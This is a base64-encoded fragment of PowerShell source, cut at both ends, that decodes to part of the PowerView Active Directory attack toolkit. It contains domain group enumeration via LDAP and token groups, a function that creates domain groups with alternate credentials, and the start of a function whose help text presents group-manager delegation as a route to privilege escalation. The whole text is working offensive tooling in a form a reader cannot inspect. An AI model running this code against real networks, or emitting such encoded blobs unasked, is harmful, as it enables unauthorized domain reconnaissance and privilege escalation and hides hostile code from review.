pbWVMaW1pdCwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW0FsaWFzKCdSZXR1cm5PbmUnKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRGaW5kT25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJEdyb3VwU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgaWYgKCRHcm91cFNlYXJjaGVyKSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ01lbWJlcklkZW50aXR5J10pIHsKCiAgICAgICAgICAgICAgICBpZiAoJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10pIHsKICAgICAgICAgICAgICAgICAgICAkT2xkUHJvcGVydGllcyA9ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJE1lbWJlcklkZW50aXR5CiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1JhdyddID0gJFRydWUKCiAgICAgICAgICAgICAgICBHZXQtRG9tYWluT2JqZWN0IEBTZWFyY2hlckFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAjIGNvbnZlcnQgdGhlIHVzZXIvZ3JvdXAgdG8gYSBkaXJlY3RvcnkgZW50cnkKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0RGlyZWN0b3J5RW50cnkgPSAkXy5HZXREaXJlY3RvcnlFbnRyeSgpCgogICAgICAgICAgICAgICAgICAgICMgY2F1c2UgdGhlIGNhY2hlIHRvIGNhbGN1bGF0ZSB0aGUgdG9rZW4gZ3JvdXBzIGZvciB0aGUgdXNlci9ncm91cAogICAgICAgICAgICAgICAgICAgICRPYmplY3REaXJlY3RvcnlFbnRyeS5SZWZyZXNoQ2FjaGUoJ3Rva2VuR3JvdXBzJykKCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdERpcmVjdG9yeUVudHJ5LlRva2VuR3JvdXBzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAjIGNvbnZlcnQgdGhlIHRva2VuIGdyb3VwIHNpZAogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTaWQgPSAoTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkXywwKSkuVmFsdWUKCiAgICAgICAgICAgICAgICAgICAgICAgICMgaWdub3JlIHRoZSBidWlsdCBpbiBncm91cHMKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRHcm91cFNpZCAtbm90bWF0Y2ggJ15TLTEtNS0zMi0uKicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRHcm91cFNpZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydSYXcnXSA9ICRGYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRPbGRQcm9wZXJ0aWVzKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJE9sZFByb3BlcnRpZXMgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwID0gR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkR3JvdXApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXAuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3Lkdyb3VwJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICAgICAkRmlsdGVyID0gJycKICAgICAgICAgICAgICAgICRJZGVudGl0eSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8KCiAgICAgICAgICAgICAgICAgICAgaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnLitcXC4rJykgewogICAgICAgICAgICAgICAgICAgICAgICAjIERPTUFJTlxncm91cG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UgPSAkSWRlbnRpdHlJbnN0YW5jZSB8IENvbnZlcnQtQUROYW1lIC1PdXRwdXRUeXBlIENhbm9uaWNhbAogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cERvbWFpbiA9ICRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlLlN1YlN0cmluZygwLCAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZS5JbmRleE9mKCcvJykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBOYW1lID0gJElkZW50aXR5SW5zdGFuY2UuU3BsaXQoJ1wnKVsxXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoc2FtQWNjb3VudE5hbWU9JEdyb3VwTmFtZSkiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJEdyb3VwRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwXSBFeHRyYWN0ZWQgZG9tYWluICckR3JvdXBEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNlJyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlJbnN0YW5jZSA9ICRJZGVudGl0eUluc3RhbmNlLlJlcGxhY2UoJygnLCAnXDI4JykuUmVwbGFjZSgnKScsICdcMjknKQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeUy0xLS4qJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0c2lkPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXkNOPS4qJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3VpZEJ5dGVTdHJpbmcgPSAoLUpvaW4gKChbR3VpZF0kSWRlbnRpdHlJbnN0YW5jZSkuVG9CeXRlQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHskXy5Ub1N0cmluZygnWCcpLlBhZExlZnQoMiwnMCcpfSkpIC1SZXBsYWNlICcoLi4pJywnXCQxJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIih8KHNhbUFjY291bnROYW1lPSRJZGVudGl0eUluc3RhbmNlKShuYW1lPSRJZGVudGl0eUluc3RhbmNlKSkiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5RmlsdGVyIC1hbmQgKCRJZGVudGl0eUZpbHRlci5UcmltKCkgLW5lICcnKSApIHsKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQWRtaW5Db3VudCddKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Hcm91cF0gU2VhcmNoaW5nIGZvciBhZG1pbkNvdW50PTEnCiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKGFkbWluY291bnQ9MSknCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlci5maWx0ZXIgPSAiKCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApJEZpbHRlcikiCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwXSBmaWx0ZXIgc3RyaW5nOiAkKCRHcm91cFNlYXJjaGVyLmZpbHRlcikiCgogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRmluZE9uZSddKSB7ICRSZXN1bHRzID0gJEdyb3VwU2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRHcm91cFNlYXJjaGVyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgcmV0dXJuIHJhdyByZXN1bHQgb2JqZWN0cwogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXAgPSAkXwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwID0gQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkR3JvdXAuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3Lkdyb3VwJykKICAgICAgICAgICAgICAgICAgICAkR3JvdXAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgICAgIHRyeSB7ICRSZXN1bHRzLmRpc3Bvc2UoKSB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0IgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRHcm91cFNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gTmV3LURvbWFpbkdyb3VwIHsKPCMKLlNZTk9QU0lTCgpDcmVhdGVzIGEgbmV3IGRvbWFpbiBncm91cCAoYXNzdW1pbmcgYXBwcm9wcmlhdGUgcGVybWlzc2lvbnMpIGFuZCByZXR1cm5zIHRoZSBncm91cCBvYmplY3QuCgpUT0RPOiBpbXBsZW1lbnQgYWxsIHByb3BlcnRpZXMgdGhhdCBOZXctQURHcm91cCBpbXBsZW1lbnRzIChodHRwczovL3RlY2huZXQubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2VlNjE3MjUzLmFzcHgpLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtUHJpbmNpcGFsQ29udGV4dCAgCgouREVTQ1JJUFRJT04KCkZpcnN0IGJpbmRzIHRvIHRoZSBzcGVjaWZpZWQgZG9tYWluIGNvbnRleHQgdXNpbmcgR2V0LVByaW5jaXBhbENvbnRleHQuClRoZSBib3VuZCBkb21haW4gY29udGV4dCBpcyB0aGVuIHVzZWQgdG8gY3JlYXRlIGEgbmV3CkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50Lkdyb3VwUHJpbmNpcGFsIHdpdGggdGhlIHNwZWNpZmllZApncm91cCBwcm9wZXJ0aWVzLgoKLlBBUkFNRVRFUiBTYW1BY2NvdW50TmFtZQoKU3BlY2lmaWVzIHRoZSBTZWN1cml0eSBBY2NvdW50IE1hbmFnZXIgKFNBTSkgYWNjb3VudCBuYW1lIG9mIHRoZSBncm91cCB0byBjcmVhdGUuCk1heGltdW0gb2YgMjU2IGNoYXJhY3RlcnMuIE1hbmRhdG9yeS4KCi5QQVJBTUVURVIgTmFtZQoKU3BlY2lmaWVzIHRoZSBuYW1lIG9mIHRoZSBncm91cCB0byBjcmVhdGUuIElmIG5vdCBwcm92aWRlZCwgZGVmYXVsdHMgdG8gU2FtQWNjb3VudE5hbWUuCgouUEFSQU1FVEVSIERpc3BsYXlOYW1lCgpTcGVjaWZpZXMgdGhlIGRpc3BsYXkgbmFtZSBvZiB0aGUgZ3JvdXAgdG8gY3JlYXRlLiBJZiBub3QgcHJvdmlkZWQsIGRlZmF1bHRzIHRvIFNhbUFjY291bnROYW1lLgoKLlBBUkFNRVRFUiBEZXNjcmlwdGlvbgoKU3BlY2lmaWVzIHRoZSBkZXNjcmlwdGlvbiBvZiB0aGUgZ3JvdXAgdG8gY3JlYXRlLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSB0byBzZWFyY2ggZm9yIHVzZXIvZ3JvdXAgcHJpbmNpcGFscywgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCk5ldy1Eb21haW5Hcm91cCAtU2FtQWNjb3VudE5hbWUgVGVzdEdyb3VwIC1EZXNjcmlwdGlvbiAnVGhpcyBpcyBhIHRlc3QgZ3JvdXAuJwoKQ3JlYXRlcyB0aGUgJ1Rlc3RHcm91cCcgZ3JvdXAgd2l0aCB0aGUgc3BlY2lmaWVkIGRlc2NyaXB0aW9uLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCk5ldy1Eb21haW5Hcm91cCAtU2FtQWNjb3VudE5hbWUgVGVzdEdyb3VwIC1EZXNjcmlwdGlvbiAnVGhpcyBpcyBhIHRlc3QgZ3JvdXAuJyAtQ3JlZGVudGlhbCAkQ3JlZAoKQ3JlYXRlcyB0aGUgJ1Rlc3RHcm91cCcgZ3JvdXAgd2l0aCB0aGUgc3BlY2lmaWVkIGRlc2NyaXB0aW9uIHVzaW5nIHRoZSBzcGVjaWZpZWQgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzLgoKLk9VVFBVVFMKCkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50Lkdyb3VwUHJpbmNpcGFsCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ0RpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50Lkdyb3VwUHJpbmNpcGFsJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVMZW5ndGgoMCwgMjU2KV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTYW1BY2NvdW50TmFtZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICROYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERpc3BsYXlOYW1lLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERlc2NyaXB0aW9uLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgJENvbnRleHRBcmd1bWVudHMgPSBAewogICAgICAgICdJZGVudGl0eScgPSAkU2FtQWNjb3VudE5hbWUKICAgIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb250ZXh0QXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCgogICAgaWYgKCRDb250ZXh0KSB7CiAgICAgICAgJEdyb3VwID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50Lkdyb3VwUHJpbmNpcGFsIC1Bcmd1bWVudExpc3QgKCRDb250ZXh0LkNvbnRleHQpCgogICAgICAgICMgc2V0IGFsbCB0aGUgYXBwcm9wcmlhdGUgZ3JvdXAgcGFyYW1ldGVycwogICAgICAgICRHcm91cC5TYW1BY2NvdW50TmFtZSA9ICRDb250ZXh0LklkZW50aXR5CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ05hbWUnXSkgewogICAgICAgICAgICAkR3JvdXAuTmFtZSA9ICROYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkR3JvdXAuTmFtZSA9ICRDb250ZXh0LklkZW50aXR5CiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0Rpc3BsYXlOYW1lJ10pIHsKICAgICAgICAgICAgJEdyb3VwLkRpc3BsYXlOYW1lID0gJERpc3BsYXlOYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkR3JvdXAuRGlzcGxheU5hbWUgPSAkQ29udGV4dC5JZGVudGl0eQogICAgICAgIH0KCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVzY3JpcHRpb24nXSkgewogICAgICAgICAgICAkR3JvdXAuRGVzY3JpcHRpb24gPSAkRGVzY3JpcHRpb24KICAgICAgICB9CgogICAgICAgIFdyaXRlLVZlcmJvc2UgIltOZXctRG9tYWluR3JvdXBdIEF0dGVtcHRpbmcgdG8gY3JlYXRlIGdyb3VwICckU2FtQWNjb3VudE5hbWUnIgogICAgICAgIHRyeSB7CiAgICAgICAgICAgICROdWxsID0gJEdyb3VwLlNhdmUoKQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LURvbWFpbkdyb3VwXSBHcm91cCAnJFNhbUFjY291bnROYW1lJyBzdWNjZXNzZnVsbHkgY3JlYXRlZCIKICAgICAgICAgICAgJEdyb3VwCiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW05ldy1Eb21haW5Hcm91cF0gRXJyb3IgY3JlYXRpbmcgZ3JvdXAgJyRTYW1BY2NvdW50TmFtZScgOiAkXyIKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluTWFuYWdlZFNlY3VyaXR5R3JvdXAgewo8IwouU1lOT1BTSVMKClJldHVybnMgYWxsIHNlY3VyaXR5IGdyb3VwcyBpbiB0aGUgY3VycmVudCAob3IgdGFyZ2V0KSBkb21haW4gdGhhdCBoYXZlIGEgbWFuYWdlciBzZXQuCgpBdXRob3I6IFN0dWFydCBNb3JnYW4gKEB1a3N0dWZ1cykgPHN0dWFydC5tb3JnYW5AbXdyaW5mb3NlY3VyaXR5LmNvbT4sIFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5PYmplY3QsIEdldC1Eb21haW5Hcm91cCwgR2V0LURvbWFpbk9iamVjdEFjbCAgCgouREVTQ1JJUFRJT04KCkF1dGhvcml0eSB0byBtYW5pcHVsYXRlIHRoZSBncm91cCBtZW1iZXJzaGlwIG9mIEFEIHNlY3VyaXR5IGdyb3VwcyBhbmQgZGlzdHJpYnV0aW9uIGdyb3VwcwpjYW4gYmUgZGVsZWdhdGVkIHRvIG5vbi1hZG1pbmlzdHJhdG9ycyBieSBzZXR0aW5nIHRoZSAnbWFuYWdlZEJ5JyBhdHRyaWJ1dGUuIFRoaXMgaXMgdHlwaWNhbGx5CnVzZWQgdG8gZGVsZWdhdGUgbWFuYWdlbWVudCBhdXRob3JpdHkgdG8gZGlzdHJpYnV0aW9uIGdyb3VwcywgYnV0IFdpbmRvd3Mgc3VwcG9ydHMgc2VjdXJpdHkgZ3JvdXBzCmJlaW5nIG1hbmFnZWQgaW4gdGhlIHNhbWUgd2F5LgoKVGhpcyBmdW5jdGlvbiBzZWFyY2hlcyBmb3IgQUQgZ3JvdXBzIHdoaWNoIGhhdmUgYSBncm91cCBtYW5hZ2VyIHNldCwgYW5kIGRldGVybWluZXMgd2hldGhlciB0aGF0CnVzZXIgY2FuIG1hbmlwdWxhdGUgZ3JvdXAgbWVtYmVyc2hpcC4gVGhpcyBjb3VsZCBiZSBhIHVzZWZ1bCBtZXRob2Qgb2YgaG9yaXpvbnRhbCBwcml2aWxlZ2UKZXNjYWxhdGlvbiwgZXNwZWNpYWxseSBpZiB0aGUgbWFuYWdlciBjYW4gbWFuaXB1bGF0ZSB0aGUgbWVtYmVyc2hpcCBvZiBhIHByaXZpbGVnZWQgZ3JvdXAuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5